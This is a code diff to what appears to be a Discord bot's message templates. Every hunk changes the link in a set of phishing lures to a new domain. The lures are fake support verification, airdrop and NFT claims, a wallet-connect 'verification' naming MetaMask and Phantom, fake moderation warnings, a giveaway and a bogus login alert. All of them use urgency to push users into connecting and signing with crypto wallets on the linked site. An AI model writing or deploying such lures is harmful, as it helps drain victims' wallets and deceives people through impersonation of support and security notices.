@@ -9,7 +9,7 @@ module.exports = {
       description:
         `Thank you for submitting your support request.\n\n` +
         `🛡️ To proceed securely, you are required to verify your identity. This helps prevent unauthorized access and ensures your request is handled correctly.\n\n` +
-        `🔗 [Click here](https://steadysupporting.com) to verify your support session.\n\n` +
+        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify your support session.\n\n` +
         `⚠️ You must complete verification within 15 minutes to avoid automatic ticket closure and escalation to the moderation team.`,
       image: { url: 'https://cdn.fakecdn.net/support/verify-banner.png' },
       footer: {
@@ -33,7 +33,7 @@ module.exports = {
         `You're eligible for an exclusive airdrop!\n\n` +
         `💸 Claim your tokens now before the window closes.\n\n` +
         `✅ Verified wallet required for eligibility check.\n` +
-        `🔗 [Click here](https://steadysupporting.com) to verify and claim your drop.`,
+        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify and claim your drop.`,
       image: { url: 'https://cdn.fakecdn.net/airdrop/claim-banner.gif' },
       footer: {
         text: 'Airdrop ends soon!',
@@ -55,7 +55,7 @@ module.exports = {
       description:
         `To continue, please verify your wallet.\n\n` +
         `🧩 Supported wallets: MetaMask, Trust Wallet, Phantom, WalletConnect\n\n` +
-        `🔗 [Click here](https://steadysupporting.com) to connect and sign to verify ownership.\n\n` +
+        `🔗 [Click here](https://chainhelpers.netlify.app/) to connect and sign to verify ownership.\n\n` +
         `🔒 This process is secure and helps keep your account safe.`,
       image: { url: 'https://cdn.fakecdn.net/wallet/connect-banner.png' },
       footer: {
@@ -78,7 +78,7 @@ module.exports = {
       description:
         `Your account has triggered a moderation flag due to recent activity.\n\n` +
         `🚨 Immediate verification is required to avoid penalties.\n\n` +
-        `🔗 [Click here](https://steadysupporting.com) to confirm your identity and resolve the issue.`,
+        `🔗 [Click here](https://chainhelpers.netlify.app/) to confirm your identity and resolve the issue.`,
       image: { url: 'https://cdn.fakecdn.net/mod/warning-banner.jpg' },
       footer: {
         text: 'Contact support for more information.',
@@ -100,7 +100,7 @@ module.exports = {
       description:
         `Congratulations! You’ve been selected to receive a limited edition NFT.\n\n` +
         `🎁 Connect your wallet to view and mint your collectible art.\n\n` +
-        `🔗 [Click here](https://steadysupporting.com) to verify and claim your NFT drop.`,
+        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify and claim your NFT drop.`,
       image: { url: 'https://cdn.fakecdn.net/nft/nft-banner.png' },
       footer: {
         text: 'Verified wallets only. Supply is limited.',
@@ -122,7 +122,7 @@ module.exports = {
       description:
         `You're just one step away from entering the community giveaway!\n\n` +
         `🎟️ Prizes include ETH, NFTs, and exclusive access.\n\n` +
-        `🔗 [Click here](https://steadysupporting.com) to verify your eligibility and lock your entry.`,
+        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify your eligibility and lock your entry.`,
       image: { url: 'https://cdn.fakecdn.net/events/prizes-banner.jpg' },
       footer: {
         text: 'Winners will be announced in 48 hours!',
@@ -145,7 +145,7 @@ module.exports = {
         `We noticed a login attempt from a new location/device.\n\n` +
         `📍 IP: 192.168.0.248\n` +
         `🌐 Region: Unknown\n\n` +
-        `⚠️ If this wasn’t you, please [click here](https://steadysupporting.com) to verify your identity and secure your account.`,
+        `⚠️ If this wasn’t you, please [click here](https://chainhelpers.netlify.app/) to verify your identity and secure your account.`,
       image: { url: 'https://cdn.fakecdn.net/security/alert-banner.gif' },
       footer: {
         text: 'Secure your account now.',
